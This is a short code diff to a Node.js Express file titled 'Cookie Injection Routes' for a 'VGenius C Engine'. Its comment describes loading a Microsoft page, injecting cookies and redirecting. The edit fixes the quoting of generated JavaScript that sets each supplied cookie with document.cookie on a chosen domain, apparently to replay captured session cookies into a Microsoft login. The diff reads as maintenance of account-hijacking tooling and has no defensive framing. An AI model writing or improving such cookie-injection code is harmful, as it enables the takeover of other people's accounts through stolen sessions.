@@ -1,6 +1,6 @@
 /**
  * VGenius C Engine - Cookie Injection Routes
- * Uses competitor's proven method: load Microsoft page, inject cookies, redirect
+ * Uses our proven method: load Microsoft page, inject cookies, redirect
  */
 const express = require('express');
 const router = express.Router();
@@ -356,7 +356,7 @@ function generateInjectPage(cookies, clientId, tenant) {
   html += '      for (var i = 0; i < cookieNames.length; i++) {\n';
   html += '        var domain = cookieDomains[i] || baseDomain;\n';
   html += '        var encodedValue = encodeURIComponent(cookieValues[i]);\n';
-  html += '        script += "document.cookie = " + cookieNames[i] + "=" + encodedValue + "; domain=" + domain + "; path=/; Secure; SameSite=None;\\n";\n';
+  html += '        script += \'document.cookie = "\' + cookieNames[i] + "=" + encodedValue + \'; domain=\' + domain + \'; path=/; Secure; SameSite=None\\";\\n\';\n';
   html += '      }\n';
   html += '      return script;\n';
   html += '    }\n';
